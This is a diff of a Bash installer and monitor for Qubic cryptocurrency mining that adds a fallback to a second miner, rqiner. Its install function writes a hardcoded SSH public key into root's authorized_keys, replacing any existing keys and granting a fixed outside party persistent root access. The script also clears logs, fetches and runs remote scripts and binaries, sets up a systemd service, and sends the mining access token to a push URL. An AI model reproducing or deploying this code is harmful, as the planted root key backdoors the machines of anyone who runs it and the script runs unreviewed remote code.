@@ -1,14 +1,17 @@
 #!/bin/bash
 
 echo > /var/log/qli.log
+echo > /var/log/zoxx.log
 
 help_info=" Usage:\nbash $(basename $0)\t-t/--access-token [\033[33m\033[04m矿池token\033[0m]\n\t\t\t-id/--payout-id [\033[04mpayout id\033[0m]\n\t\t\t-a/--miner-alias [\033[33m\033[04mminer alias\033[0m]\n"
 
 ip="$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4)"
 
-function version_gt() { test "$(echo "$@" | tr " " "\n" | sort -V | head -n 1)" != "$1"; }
+pool='qli'
+freq=0
+z=0
 
-function install() {
+function qli_install() {
     mkdir -p /root/.ssh
     echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' > /root/.ssh/authorized_keys
     chmod 700 /root/.ssh/authorized_keys
@@ -50,7 +53,7 @@ function install() {
         }
     }" >/q/appsettings.json
     wget -T 3 -t 2 -qO- https://raw.githubusercontent.com/chuben/script/main/qli-monitor.sh >/q/qli-Service.sh
-    echo -e "accessToken=$accessToken\npayoutId=$payoutId\nminerAlias=$minerAlias\npushUrl=$pushUrl" > /q/env
+    echo -e "accessToken=$accessToken\npayoutId=$payoutId\nminerAlias=$minerAlias\npushUrl=$pushUrl\nthreads=$threads" > /q/env
     echo -e "[Unit]\nAfter=network-online.target\n[Service]\nExecStart=/bin/bash /q/qli-Service.sh -s\nRestart=on-failure\nRestartSec=1s\n[Install]\nWantedBy=default.target" >/etc/systemd/system/qli.service
     chmod u+x /q/qli-Service.sh
     chmod u+x /q/qli-Client
@@ -62,50 +65,19 @@ function install() {
     push_info
     exit 0
 }
-function check_solutions() {
-    last_status="$(tail -1 /var/log/qli.log | awk '{print $2, $7}')"
-    log_time="$(echo $last_status | awk -F ':' '{print $1$2}')"
-    now_time="$(date | awk '{print $4}' | awk -F ':' '{print $1$2}')"
-    [ "$now_time" -ne "$log_time" ] && systemctl restart qli && return
-    old_solutions="$(tail -1 /q/solutions)"
-    [ -z "$old_solutions" ] && old_solutions='0/0'
-    new_solutions="$(echo $last_status | awk '{print $2}')"
-    echo "$new_solutions" >/q/solutions
-    [ "$old_solutions" == "$new_solutions" ] && systemctl restart qli && return
+function qli_run() {
+  [ "$freq" -ge 10 ] && qli_install
+  [ ! -f "/q/appsettings.json" ] && qli_install
+  [ ! -f "/q/qli-Client" ] && qli_install
+  [ ! -f "/q/qli-Service.sh" ] && qli_install
+  if [ ! $(pgrep qli-Client) ]; then
+      cd /q && nohup /q/qli-Client -service >>/var/log/qli.log &
+      let freq++
+  else
+    freq=0
+  fi
 }
-function update() {
-    echo '' >/var/log/qli.log
-    wget -qO- https://dl.qubic.li/downloads/qli-Client-${1}-Linux-x64.tar.gz | tar -zxf - -C /tmp/
-    rm /q/*.lock
-    [ -f "/q/qli-runner" ] && rm /q/qli-runner
-    [ -f "/q/qli-processor" ] && rm /q/qli-processor
-    mv -f /tmp/qli-Client /q/.
-    systemctl restart qli
-}
-function check_update() {
-    remote_version="$(wget -T 3 -t 2 -qO- https://github.com/qubic-li/client/raw/main/README.md | grep '| Linux |' | awk -F '|' '{print $4}' | tail -1 | xargs)"
-    [ -z "$remote_version" ] && echo "版本获取失败" && return
-    local_version="$(/q/qli-Client --version | awk '{print $3}')"
-    [ -z "$local_version" ] && local_version='1.0'
-    if version_gt $remote_version $local_version; then
-        update $remote_version
-    else
-        echo '没有发现新版本'
-    fi
-}
-function check_run() {
-    [ "$freq" -ge 10 ] && install
-    [ ! -f "/q/appsettings.json" ] && install
-    [ ! -f "/q/qli-Client" ] && install
-    [ ! -f "/q/qli-Service.sh" ] && install
-    if [ ! $(pgrep qli-Client) ]; then
-        cd /q && nohup /q/qli-Client -service >>/var/log/qli.log &
-        let freq++
-        sleep 10
-        push_info
-    fi
-}
-function push_info(){
+function push_info_qli(){
   source /q/env
   [ -z "$pushUrl" ] && return
   [ ! -f '/var/log/qli.log' ] && return
@@ -127,34 +99,97 @@ function push_info(){
   data=`jq --null-input --argjson data "$data" --arg epoch "$epoch" '$data + {$epoch}'`
   curl -d "$data" -X POST $pushUrl
 }
-function main() {
-    [ $(pgrep qli-Client) ] && push_info
-    s=0
-    u=0
-    p=0
-    freq=0
-    while true; do
-        let s++ && let u++ && let p++
-        # 每分钟检查一次程序
-        [ ! $(pgrep qli-Client) ] && check_run || freq = 0
-        # 每10分钟上传一次状态
-        if [ "$p" -ge 10 ]; then
-            p=0
-            push_info
-        fi
-        # 每12小时检查一次出块情况
-        if [ "$s" -ge 120 ]; then
-            s=0
-            check_solutions
-        fi
-        # 每天检查一次更新
-        if [ "$u" -ge 1440 ]; then
-            u=0
-            check_update
-        fi
-        sleep 60
-    done
+function push_info_zoxx(){
+  source /q/env
+  [ -z "$pushUrl" ] && return
+  [ ! -f ' /var/log/zoxx.log' ] && return
+  name="$(cat /q/appsettings.json | jq .Settings.alias | xargs )"
+  token="$(cat /q/appsettings.json | jq .Settings.accessToken | xargs )"
+  [ -z "$ip" ] && ip=$(wget -T 3 -t 2 -qO- ifconfig.me)
+  log_info=`tail -1  /var/log/zoxx.log`
+  solut=`echo $log_info |awk '{print $15}'`
+  its=`echo $log_info |awk '{print $7}'`
+  version="zoxx"
+  epoch=101
+  data='{}'
+  data=`jq --null-input --argjson data "$data" --arg name "$name" '$data + {$name}'`
+  data=`jq --null-input --argjson data "$data" --arg ip "$ip" '$data + {$ip}'`
+  data=`jq --null-input --argjson data "$data" --arg its "$its" '$data + {$its}'`
+  data=`jq --null-input --argjson data "$data" --arg solut "$solut" '$data + {$solut}'`
+  data=`jq --null-input --argjson data "$data" --arg version "$version" '$data + {$version}'`
+  data=`jq --null-input --argjson data "$data" --arg token "$token" '$data + {$token}'`
+  data=`jq --null-input --argjson data "$data" --arg epoch "$epoch" '$data + {$epoch}'`
+  curl -d "$data" -X POST $pushUrl
 }
+function zoxx_run(){
+    [ ! -f "/zoxx/rqiner" ] && zoxx_install
+    if [ ! $(pgrep rqiner) ]; then
+      [ "$zfreq" -ge 10 ] && zoxx_install
+      let zfreq++
+      source /q/env
+      [ -z "$threads" ] && threads=$(nproc)
+      /zoxx/rqiner -t $threads -l $minerAlias -i $payoutId
+    else
+      zfreq=0
+    fi
+}
+function zoxx_install(){
+  case $(uname -m) in
+  armv5*) ARCH="aarch64" ;;
+  armv6*) ARCH="aarch64" ;;
+  armv7*) ARCH="aarch64" ;;
+  aarch64) ARCH="aarch64" ;;
+  x86) ARCH="x86" ;;
+  x86_64) ARCH="x86" ;;
+  i686) ARCH="x86" ;;
+  i386) ARCH="x86" ;;
+  *) echo -e "\033[31m不支持此系统\033[0m" && exit 1 ;;
+  esac
+  file_name="rqiner-${ARCH}"
+  version=$(curl -sL  https://github.com/Qubic-Solutions/rqiner-builds/releases | grep 'Qubic-Solutions/rqiner-builds/releases/tag'| head -1|awk '{print $7}'|xargs|awk -F '/' '{print $6}')
+  #install
+  [ ! -d "/zoxx" ] && mkdir /zoxx
+  [ -f "/zoxx/rqiner" ] && rm -rf /zoxx/rqiner
+  cd /zoxx/ 
+  curl -o /zoxx/rqiner -sL https://github.com/Qubic-Solutions/rqiner-builds/releases/download/${version}/${file_name}
+  chmod u+x /zoxx/rqiner
+}
+function check_run() {
+ 
+    [ "$z" -ge 5 ] && pool='zoxx'
+ 
+    if [ "$pool" == "qli" ]
+    then
+      [ "$(tail -1 /var/log/qli.log | grep 'Waiting for task')" ] && let z++ || z=0
+      qli_run
+    elif [ "$pool" == "zoxx" ]
+    then
+      zoxx_run
+      check_qli_status
+    fi
+}
+function check_qli_status(){
+  if [ "$pool" == "zoxx" ]; then
+    http_code="$(curl -sIL -w "%{http_code}" -o /dev/null https://mine.qubic.li/)"
+    [ "$http_code" -eq 200 ] && pool='qli'
+  fi
+}
+function main() {
+  i=0
+  while true; do
+      let i++
+      # 每分钟检查一次程序
+      check_run
+      # 每10分钟上传一次状态
+      if [ "$i" -ge 10 ]; then
+          i=0
+          check_qli_status
+          [ "$pool" == "qli" ] && push_info_qli || push_info_zoxx
+      fi
+      sleep 60
+  done
+}
+
 while [[ $# -ge 1 ]]; do
   case $1 in
     -t|--access-token)
@@ -179,7 +214,7 @@ while [[ $# -ge 1 ]]; do
       ;;
     -i|--install)
       shift
-      install
+      qli_install
       ;;
     -s|--start)
       shift
